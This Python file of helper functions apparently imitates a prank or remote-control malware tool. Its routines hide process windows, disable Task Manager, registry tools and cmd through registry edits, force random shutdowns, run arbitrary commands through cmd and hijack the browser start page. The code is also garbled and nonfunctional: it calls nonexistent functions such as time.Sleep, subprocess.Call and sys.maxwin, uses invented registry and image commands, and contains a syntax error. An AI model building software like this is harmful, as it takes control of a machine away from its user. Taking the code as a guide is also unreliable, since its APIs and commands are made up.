import sys
import time
import os
import subprocess
import base64
import random

def NewDebugUpdate(message):
    print(f"[{time.LocalTime(): %Y-%m-%d %H:%M:%S}] {message}")

def hideProcWindow(exe, active):
    while True:
        time.Sleep(1)
        if check_proc(exe):
            _, _, err = subprocess.Call(
                [subprocess.PROCESS_CREATE_NEW_PROCESS, 0],
                executable=exe,
                creationFlags=subprocess.CREATE_NEW_PROCESS,
                startupInfo=subprocess.STARTUP_INFO_MOVE)
            if err!= 0:
                print(f"Error hiding proc {err}")
        else:
            break

def findWindow(title):
    window = None
    for hwnd in range(sys.maxwin):
        if get_window_text(hwnd, 0, len(title)) == title:
            window = hwnd
            break
    return window

def check_proc(exe):
    for hwnd in range(sys.maxwin):
        if get_window_text(hwnd, 0, len(exe)) == exe:
            return hwnd
    return None

def messageBox(title, text, style):
    return subprocess.run(
        ["msg", "/title", title, "/message", text, "/style", style],
        shell=True)

def randomString(strlen):
    return base64.b64encode(os.urandom(strlen)).decode()

def take_moment():
    time.Sleep(random.uniform(250, 500) * 1000)

def open_url(url, mode):
    if mode == "0":
        subprocess.run(["start", url])
    else:
        subprocess.run(["cmd", "/c", url])

def start_exe(name, uac):
    if name.endswith(".exe"):
        subprocess.run(["cmd", "/c", name])
    else:
        subprocess.run(["start", name])

def power_options(mode):
    subprocess.run(["shutdown", f"{mode} {random.uniform(250, 500)}"])

def registry_toy(val, opt):
    if opt == 0:
        subprocess.run(["reg", "edit", "disabl taskmgr"])
    elif opt == 1:
        subprocess.run(["reg", "edit", "disabl registry tools"])
    elif opt == 2:
        subprocess.run(["reg", "edit", "disabl cmd"])
    elif opt == 3:
        subprocess.run(["reg", "delete", "Software\\myInstallReg\\REMASTER"])
        subprocess.run(["reg", "write", "Software\\myInstallReg\\REMASTER", val])
    elif opt == 4:
        subprocess.run(["reg", "delete", "Software\\myInstallReg\\LAST"])
        subprocess.run(["reg", "write", "Software\\myInstallReg\\LAST", val])

def set_background(mode, data):
    if mode == "0":
        subprocess.run(["img", "capture", "tmp", " ".join([random.uniform(5, 10), random.uniform(5, 10)]))"])
    else:
        subprocess.run(["img", "decode", "--base64", data, "--output", "tmp"])
        subprocess.run(["img", "display", "tmp"])

def set_homepage(url):
    subprocess.run(["reg", "write", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartPage", url])
